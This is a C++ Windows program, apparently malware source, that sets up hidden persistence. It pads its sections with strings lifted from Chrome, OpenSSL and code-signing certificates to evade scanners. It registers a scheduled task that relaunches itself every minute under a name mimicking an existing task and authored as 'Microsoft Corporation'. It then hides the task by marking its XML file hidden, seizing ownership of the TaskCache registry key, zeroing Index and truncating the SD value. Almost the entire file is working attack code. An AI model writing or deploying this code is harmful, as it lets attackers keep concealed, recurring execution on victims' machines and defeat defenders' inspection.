#include <windows.h>
#include <comdef.h>
#include <taskschd.h>
#include <atlbase.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <aclapi.h>
#include "PEstruct.h"
#include "helper.h"
#include "jk.h"

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")


#pragma code_seg(".text")
__declspec(allocate(".text")) char* e[] = { (char*)"---------------------------7d9114302a0cb6", (char*)"Vector Permutation AES for x86/SSSE3, Mike Hamburg (Stanford University)", (char*)"too many files open in system", (char*)"Resource temporarily unavailable" , (char*)"../../third_party/perfetto/src/protozero/scattered_heap_buffer.cc" , (char*)"../../base/trace_event/trace_log.cc" , (char*)"Histogram.MismatchedConstructionArguments" , (char*)"web_cache/Encoded_size_duplicated_in_data_urls" , (char*)"2DigiCert Trusted G4 RSA4096 SHA256 TimeStamping CA" , (char*)"Beijing Qihu Technology Co., Ltd.0" };


#pragma code_seg(".data")
__declspec(allocate(".data")) char* e2[] = { (char *)"GHASH for x86, CRYPTOGAMS by <appro@openssl.org>", (char*)"inappropriate io control operation", (char*)"illegal byte sequence" , (char*)"no such file or directory", (char*)"Inappropriate I/O control operation", (char*)"Content-Disposition: form-data; name=\"", (char*)"disabled-by-default-java-heap-profiler" , (char*)"disabled-by-default-devtools.timeline.invalidationTracking" , (char*)"Unsupported (crbug.com/1225176)\"" , (char*)"net/http_network_session_0x?/ssl_client_session_cache" , (char*)"net/url_request_context/isolated_media/0x?/cookie_monster/tasks_pending_global" , (char*)"Ihttp://crl3.digicert.com/DigiCertTrustedG4RSA4096SHA256TimeStampingCA.crl0" ,(char*)"Beijing Qihu Technology Co., Ltd.0" };

std::wstring g_taskName;


std::wstring GetCurrentProcessPath()
{
    wchar_t buffer[MAX_PATH];
    GetModuleFileName(NULL, buffer, MAX_PATH); // 获取当前模块的文件名（包括路径）
    return std::wstring(buffer); // 返回包含路径的完整文件名
}
std::wstring getCurrentDateTimeString() {
    // 获取当前时间点
    auto now = std::chrono::system_clock::now();

    // 将时间点转换为 time_t
    std::time_t now_c = std::chrono::system_clock::to_time_t(now);

    // 使用 localtime 将 time_t 转换为本地时间结构 tm
    std::tm tm = *std::localtime(&now_c);

    // 格式化输出
    wchar_t buffer[20]; 
    std::wcsftime(buffer, sizeof(buffer) / sizeof(wchar_t), L"%Y-%m-%dT%H:%M:%S", &tm);

    return std::wstring(buffer);
}

// 隐藏计划任务对应的xml文件
void HideFile()
{

    if (!g_taskName.empty()) {
        std::wstring basePath = TEXT("C:\\Windows\\System32\\Tasks\\");
        std::wstring finalPath = basePath + g_taskName;
        LPCWSTR lpFinalPath = finalPath.c_str();  // 转换为 LPCWSTR

        DWORD currentAttributes = GetFileAttributes(lpFinalPath);

        // 设置文件属性为隐藏和系统文件
        if ((currentAttributes & (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) != (FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
            SetFileAttributes(lpFinalPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
        }
    }
}



void ShowErrorMessageBox(const std::string& message) {
    MessageBoxA(NULL, message.c_str(), "Error", MB_ICONERROR | MB_OK);
}
void ShowErrorWithCode(const std::string& message, DWORD errorCode) {
    LPVOID lpMsgBuf;
    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        errorCode,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&lpMsgBuf,
        0,
        NULL
    );
    std::string fullMessage = message + ": " + static_cast<char*>(lpMsgBuf);
    MessageBoxA(NULL, fullMessage.c_str(), "Error", MB_ICONERROR | MB_OK);
    LocalFree(lpMsgBuf);
}

void ModifyIndex(const std::string& keyPath, DWORD newValue) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_SET_VALUE, &hKey);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorMessageBox("Error opening registry key");
    //    return;
    //}

    result = RegSetValueExA(hKey, "Index", 0, REG_DWORD, reinterpret_cast<BYTE*>(&newValue), sizeof(DWORD));
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorMessageBox("Error setting registry value");
    //}
    //else {
    //    MessageBoxA(NULL, "Registry value updated successfully", "Success", MB_ICONINFORMATION | MB_OK);
    //}

    RegCloseKey(hKey);
}
void ModifySD(const std::string& keyPath) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath.c_str(), 0, KEY_QUERY_VALUE | KEY_SET_VALUE, &hKey);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error opening registry key", result);
    //    return;
    //}

    DWORD dataType;
    DWORD dataSize;
    result = RegQueryValueExA(hKey,"SD", NULL, &dataType, NULL, &dataSize);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error querying registry value size", result);
    //    RegCloseKey(hKey);
    //    return;
    //}

    //if (dataType != REG_BINARY) {
    //    ShowErrorMessageBox("Registry value is not of type REG_BINARY");
    //    RegCloseKey(hKey);
    //    return;
    //}

    std::vector<BYTE> data(dataSize);
    result = RegQueryValueExA(hKey, "SD", NULL, &dataType, data.data(), &dataSize);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error querying registry value", result);
    //    RegCloseKey(hKey);
    //    return;
    //}

    // 计算前一半的数据
    dataSize /= 2;
    std::vector<BYTE> newData(data.begin(), data.begin() + dataSize);

    result = RegSetValueExA(hKey, "SD", 0, REG_BINARY, newData.data(), newData.size());
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error setting registry value", result);
    //}
    //else {
    //    MessageBoxA(NULL, "Registry value updated successfully", "Success", MB_ICONINFORMATION | MB_OK);
    //}

    RegCloseKey(hKey);
}

void SetRegistryKeyOwnerAndPermissions(const std::string& keyPath) {
    PSID pSid = NULL;
    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;

    if (!AllocateAndInitializeSid(&SIDAuthNT, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pSid)) {
        ShowErrorWithCode("Error initializing SID", GetLastError());
        return;
    }

    // 使用 SetNamedSecurityInfoA 设置所有者
    DWORD result = SetNamedSecurityInfoA(
        const_cast<LPSTR>(keyPath.c_str()), SE_REGISTRY_KEY, OWNER_SECURITY_INFORMATION,
        pSid, NULL, NULL, NULL);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error setting key owner", result);
    //    FreeSid(pSid);
    //    return;
    //}

    PACL pOldDACL = NULL, pNewDACL = NULL;
    PSECURITY_DESCRIPTOR pSD = NULL;

    result = GetNamedSecurityInfoA(
        keyPath.c_str(), SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
        NULL, NULL, &pOldDACL, NULL, &pSD);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error getting current DACL", result);
    //    FreeSid(pSid);
    //    return;
    //}

    EXPLICIT_ACCESS ea;
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = KEY_ALL_ACCESS;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_SID;
    ea.Trustee.TrusteeType = TRUSTEE_IS_GROUP;
    ea.Trustee.ptstrName = (LPWSTR)pSid;

    result = SetEntriesInAcl(1, &ea, pOldDACL, &pNewDACL);
    //if (result != ERROR_SUCCESS) {
    //    ShowErrorWithCode("Error setting new DACL", result);
    //    LocalFree(pSD);
    //    FreeSid(pSid);
    //    return;
    //}

    result = SetNamedSecurityInfoA(
        const_cast<LPSTR>(keyPath.c_str()), SE_REGISTRY_KEY, DACL_SECURITY_INFORMATION,
        NULL, NULL, pNewDACL, NULL);
 /*   if (result != ERROR_SUCCESS) {
        ShowErrorWithCode("Error applying new DACL", result);
    }
    else {
        MessageBoxA(NULL, "Registry key owner and permissions updated successfully", "Success", MB_ICONINFORMATION | MB_OK);
    }*/

    LocalFree(pSD);
    LocalFree(pNewDACL);
    FreeSid(pSid);
}

bool CheckRegistryForTaskCreation() {
    HKEY hKey;
    DWORD dwDisposition;
    LONG lResult = RegCreateKeyEx(
        HKEY_CURRENT_USER,
        charToLPCWSTR("SOFTWARE\\DXR"),
        0,
        NULL,
        0,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        &dwDisposition
    );

    if (lResult != ERROR_SUCCESS) {
        // ShowErrorWithCode("Error creating/opening registry key", lResult);
        return false;
    }

    if (dwDisposition == REG_CREATED_NEW_KEY) {
        DWORD value = 1;
        RegSetValueEx(hKey, charToLPCWSTR("TaskCreated"), 0, REG_DWORD, reinterpret_cast<BYTE*>(&value), sizeof(value));
        RegCloseKey(hKey);
        return true;
    }
    else {
        DWORD value = 0;
        DWORD valueSize = sizeof(value);
        lResult = RegQueryValueEx(hKey, charToLPCWSTR("TaskCreated"), NULL, NULL, reinterpret_cast<BYTE*>(&value), &valueSize);
        RegCloseKey(hKey);
        return value == 0;
    }
}



int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
   

    LPWSTR* argv;
    int argc;
    argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    if (true) {

        if (!CheckRegistryForTaskCreation()) {
            return 0;
        }
        // 开启权限
        SetPrivilege(SE_RESTORE_NAME);
        SetPrivilege(SE_BACKUP_NAME);
        SetPrivilege(SE_TAKE_OWNERSHIP_NAME);

        // 创建计划任务
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        hr = CoInitializeSecurity(
            NULL,
            -1,
            NULL,
            NULL,
            RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
            RPC_C_IMP_LEVEL_IMPERSONATE,
            NULL,
            0,
            NULL
        );

        std::vector<std::wstring> taskNames;
        CComPtr<ITaskService> pService;
        hr = pService.CoCreateInstance(CLSID_TaskScheduler);
        hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());

        CComPtr<ITaskFolder> pRootFolder;
        hr = pService->GetFolder(_bstr_t(TEXT("\\")), &pRootFolder);

        CComPtr<IRegisteredTaskCollection> pTaskCollection;
        hr = pRootFolder->GetTasks(TASK_ENUM_HIDDEN, &pTaskCollection);
        LONG numTasks = 0;
        hr = pTaskCollection->get_Count(&numTasks);

        for (LONG i = 0; i < numTasks; i++)
        {
            CComPtr<IRegisteredTask> pRegisteredTask;
            hr = pTaskCollection->get_Item(_variant_t(i + 1), &pRegisteredTask);
            if (SUCCEEDED(hr))
            {
                CComBSTR taskName;
                hr = pRegisteredTask->get_Name(&taskName);
                std::wstring name(taskName);
                taskNames.push_back(std::wstring(taskName));
            }
        }

        std::srand(static_cast<unsigned int>(std::time(nullptr)));
        int randomIndex = std::rand() % taskNames.size();
        std::wstring randomTaskName = taskNames[randomIndex];
        randomTaskName += TEXT("(Manual)");


        g_taskName = randomTaskName;

        ITaskDefinition* pTask = NULL;
        hr = pService->NewTask(0, &pTask);

        IRegistrationInfo* pRegInfo = NULL;
        hr = pTask->get_RegistrationInfo(&pRegInfo);
        hr = pRegInfo->put_Author(ConvertCharToBSTR("Microsoft Corporation"));
        pRegInfo->Release();

        IPrincipal* pPrincipal = NULL;
        hr = pTask->get_Principal(&pPrincipal);
        hr = pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->Release();

        ITaskSettings* pSettings = NULL;
        hr = pTask->get_Settings(&pSettings);
        hr = pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->Release();

        IIdleSettings* pIdleSettings = NULL;
        hr = pSettings->get_IdleSettings(&pIdleSettings);
        hr = pIdleSettings->put_WaitTimeout(ConvertCharToBSTR("PT5M"));
        pIdleSettings->Release();

        ITriggerCollection* pTriggerCollection = NULL;
        hr = pTask->get_Triggers(&pTriggerCollection);

        ITrigger* pTrigger = NULL;
        hr = pTriggerCollection->Create(TASK_TRIGGER_TIME, &pTrigger);
        pTriggerCollection->Release();

        ITimeTrigger* pTimeTrigger = NULL;
        hr = pTrigger->QueryInterface(IID_ITimeTrigger, (void**)&pTimeTrigger);
        pTrigger->Release();

        hr = pTimeTrigger->put_Id(_bstr_t(L"Trigger1"));
        hr = pTimeTrigger->put_StartBoundary(_bstr_t(getCurrentDateTimeString().c_str()));

        CComPtr<IRepetitionPattern> pRepetitionPattern;
        hr = pTimeTrigger->get_Repetition(&pRepetitionPattern);
        hr = pRepetitionPattern->put_Interval(_bstr_t(L"PT1M")); // 每分钟触发一次

        IActionCollection* pActionCollection = NULL;
        hr = pTask->get_Actions(&pActionCollection);

        IAction* pAction = NULL;
        hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        pActionCollection->Release();

        IExecAction* pExecAction = NULL;
        hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
        pAction->Release();

        hr = pExecAction->put_Path(_bstr_t(GetCurrentProcessPath().c_str()));

        IRegisteredTask* pRegisteredTask = NULL;
        hr = pRootFolder->RegisterTaskDefinition(
            _bstr_t(randomTaskName.c_str()),
            pTask,
            TASK_CREATE_OR_UPDATE,
            _variant_t(),
            _variant_t(),
            TASK_LOGON_INTERACTIVE_TOKEN,
            _variant_t(L""),
            &pRegisteredTask
        );



        HideFile();


        std::string keyPath = "MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\" + WStringToString(g_taskName);
        SetRegistryKeyOwnerAndPermissions(keyPath);


        keyPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\" + WStringToString(g_taskName);
        DWORD newValue = 0;
        ModifyIndex(keyPath, newValue);
        ModifySD(keyPath);



        pTask->Release();
        pRegisteredTask->Release();
        CoUninitialize();


    }else{
           // 质数计算
           doCalc();
    }


   


    return 0;
}